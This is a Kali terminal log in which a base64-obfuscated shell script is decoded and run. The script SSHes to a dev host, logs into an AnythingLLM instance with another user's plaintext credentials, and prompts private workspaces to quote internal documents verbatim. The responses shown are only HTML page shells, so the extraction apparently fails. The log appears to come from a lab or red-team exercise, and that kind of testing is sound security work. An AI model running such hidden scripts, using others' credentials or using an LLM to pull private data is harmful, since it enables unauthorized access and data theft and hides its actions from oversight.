@@ -1,0 +1,81 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/s9.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKc2V0ICtlCkNBPS9ob21lL3Jvd2FuLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkE9aHR0cHM6Ly9hc3Npc3RhbnQua2VwbGVyb3BzLnRlc3QKVEs9JChjdXJsIC1zUyAtbSAxNSAtLWNhY2VydCAkQ0EgLVggUE9TVCAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtZCAneyJ1c2VybmFtZSI6Im1heWEucmFuc2NvbWJlIiwicGFzc3dvcmQiOiJzV1FhMzEwODVGVFFla1poSFR4VXlmXzlFMW1hcnEwdXI4V05DS21UdG5rIn0nICRBL2FwaS9yZXF1ZXN0LXRva2VuIHwgcHl0aG9uMyAtYyAiaW1wb3J0IHN5cyxqc29uO3ByaW50KGpzb24ubG9hZChzeXMuc3RkaW4pWyd0b2tlbiddKSIpCmVjaG8gIj09PT09IHN5bmMgY2hhdCB3b3Jrc3BhY2UyID09PT09IgpjdXJsIC1zUyAtbSAxODAgLS1jYWNlcnQgJENBIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFRLIiAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtWCBQT1NUIFwKICAtZCAneyJtZXNzYWdlIjoiV2hhdCBkb2N1bWVudHMgZG8geW91IGhhdmUgYWJvdXQgdGhlIEFSV0Mgc3VwcG9ydCBjYXNlPyBRdW90ZSBBVFQtRElBRy02OTgubWQgdmVyYmF0aW0uIiwibW9kZSI6ImNoYXQiLCJhdHRhY2htZW50cyI6W119JyBcCiAgLW8gL3RtcC9jMi5qc29uIC13ICdjaGF0ICV7aHR0cF9jb2RlfSAle3NpemVfZG93bmxvYWR9XG4nICRBL2FwaS93b3Jrc3BhY2Uvc3VwcG9ydC1wcml2YXRlL2NoYXQKaGVhZCAtYyA1MDAwIC90bXAvYzIuanNvbjsgZWNobwplY2hvICI9PT09PSB0aHJlYWRzIGFmdGVyID09PT09IgpjdXJsIC1zUyAtbSAyMCAtLWNhY2VydCAkQ0EgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkVEsiIC1vIC90bXAvdGguanNvbiAkQS9hcGkvd29ya3NwYWNlL3N1cHBvcnQtcHJpdmF0ZS90aHJlYWRzCmhlYWQgLWMgMjAwMCAvdG1wL3RoLmpzb247IGVjaG8KZWNobyAiPT09PT0gd29ya3NwYWNlMSBzeW5jIGNoYXQgPT09PT0iCmN1cmwgLXNTIC1tIDE4MCAtLWNhY2VydCAkQ0EgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkVEsiIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1YIFBPU1QgXAogIC1kICd7Im1lc3NhZ2UiOiJMaXN0IHRoZSBkb2N1bWVudHMgeW91IGNhbiBzZWUgYW5kIHF1b3RlIHdvcmtpbmctZ3VpZGUubWQgdmVyYmF0aW0uIiwibW9kZSI6ImNoYXQiLCJhdHRhY2htZW50cyI6W119JyBcCiAgLW8gL3RtcC9jMS5qc29uIC13ICdjaGF0ICV7aHR0cF9jb2RlfSAle3NpemVfZG93bmxvYWR9XG4nICRBL2FwaS93b3Jrc3BhY2UvZmllbGRsaW5rLW9wZXJhdGlvbnMvY2hhdApoZWFkIC1jIDQwMDAgL3RtcC9jMS5qc29uOyBlY2hvCklOTkVSCg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/s9.sh; bash /tmp/s9.sh; echo DONEMARK_1795204210603$((6*7))
+===== sync chat workspace2 =====
+chat 200 1926
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<link rel="icon" href="/favicon.png" >
+<link rel="apple-touch-icon" href="/favicon.png" >
+<meta name="mobile-web-app-capable" content="yes" >
+<meta name="apple-mobile-web-app-capable" content="yes" >
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" >
+<link rel="manifest" href="/manifest.json" >
+            <script type="module" crossorigin src="/index.js"></script>
+            <link rel="stylesheet" href="/index.css">
+          </head>
+          <body>
+            <div id="root" class="h-screen"></div>
+          </body>
+        </html>
+===== threads after =====
+{"threads":[],"defaultThreadChatCount":0}
+===== workspace1 sync chat =====
+chat 200 1926
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<link rel="icon" href="/favicon.png" >
+<link rel="apple-touch-icon" href="/favicon.png" >
+<meta name="mobile-web-app-capable" content="yes" >
+<meta name="apple-mobile-web-app-capable" content="yes" >
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" >
+<link rel="manifest" href="/manifest.json" >
+            <script type="module" crossorigin src="/index.js"></script>
+            <link rel="stylesheet" href="/index.css">
+          </head>
+          <body>
+            <div id="root" class="h-screen"></div>
+          </body>
+        </html>
